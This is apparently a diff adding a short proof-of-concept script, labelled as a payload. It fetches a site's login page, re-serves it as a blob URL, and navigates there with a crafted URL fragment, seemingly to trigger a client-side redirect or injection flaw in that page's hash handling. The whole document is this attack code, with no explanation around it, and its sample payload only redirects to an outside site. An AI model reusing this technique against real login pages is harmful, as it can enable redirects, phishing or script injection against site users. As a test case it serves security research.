@@ -1,0 +1,17 @@
+<script>
+
+// Payload
+payload='x#https://openai.com';
+
+
+fetch('/login.html').then(r => r.text()).then(h => {htmlContent = h;
+
+
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+
+            const url = URL.createObjectURL(blob);
+
+            location=url+'#'+payload;
+
+});
+</script>
